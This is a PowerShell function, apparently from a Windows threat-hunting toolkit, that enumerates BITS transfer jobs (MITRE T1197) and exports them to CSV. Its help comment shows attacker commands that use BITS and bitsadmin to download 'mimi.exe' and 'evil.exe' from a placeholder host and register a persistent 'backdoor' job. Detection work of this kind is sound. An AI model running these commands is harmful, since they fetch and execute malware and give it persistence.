function Invoke-BitsJobs {
    <#
    .SYNOPSIS

    MITREATT&CK : https://attack.mitre.org/techniques/T1197/

    .DESCRIPTION

    MITREATT&CK : https://attack.mitre.org/techniques/T1197/

    .PARAMETER OutFile

    Export result to csv file. It can be absolute or relative path.

    .PARAMETER Show

    Output result


    .EXAMPLE 

    Invoke-BitsJobs -Show
    Invoke-BitsJobs -OutFile .\T1197-BitsJobs.csv -Show


    Start-BitsTransfer -Source "http://www.totallylegitinappnews.com/mimi.jpg" -Destination "c:\Windows\vss\mimi.exe"

    # Peristence via bitsadmin.exe
    CMD> bitsadmin /create backdoor
    CMD> bitsadmin /addfile backdoor "http://www.totallylegitinappnews.com/evil.exe"  "c:\windows\VSS\evil.exe"
    CMD> bitsadmin /SetNotifyCmdLine backdoor c:\Windows\VSS\evil.exe NULL
    CMD> bitsadmin /resume backdoor

    #>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $False )]
        [string]$OutFile,
        [Parameter(Mandatory = $False )]
        [switch]$Show
    )

    Import-Module -Name ($PSScriptRoot + "\..\..\Utils\Invoke-Utils.psd1") -Force

    # Main
    $ResultList = New-Object System.Collections.Generic.List[System.Object]
    $ObjFields = @("ACLFlags","BytesTotal","BytesTransferred","CertificateHash","CertificateStoreLocation","CertificateStoreName","CertificateSubjectName","CreationTime","CustomHeaders","Description","DisplayName","Dynamic","ErrorCondition","ErrorContext","ErrorContextDescription","ErrorDescription","FileList","FilesTotal","FilesTransferred","HttpMethod","InternalErrorCode","JobId","JobState","MaxDownloadTime","ModificationTime","NotifyCmdLine","NotifyFlags","OwnerAccount","Priority","ProxyBypassList","ProxyList","ProxyUsage","RetryInterval","RetryTimeout","SecurityFlags","TransferCompletionTime","TransferPolicy","TransferType","TransientErrorCount")

    Get-BitsTransfer -AllUsers | ForEach-Object {
      
        $BitObj =  [PSCustomObject]@{}
        $properties = $_ | Get-Member -MemberType Property 
        foreach($prop in $properties){
            $BitObj | Add-Member -MemberType NoteProperty -Name $prop.Name -Value  ($_.($prop.Name) -join ",")
        }
        $ResultList.Add($BitObj)
    }

    # Outputs

    $sortedProperties = $ObjFields

    if($PSBoundParameters.ContainsKey('OutFile') -eq $true){
        $ResultList | Select-Object $sortedProperties | Export-Csv -Path $OutFile -NoTypeInformation -Encoding UTF8
    }

    if($PSBoundParameters.ContainsKey('Show') -eq $true){
        Write-Output  $ResultList | Select-Object $sortedProperties | Format-List
    }

    return $ResultList

}

#Invoke-BitsJobs -OutFile .\T1197-BitsJobs.csv -Show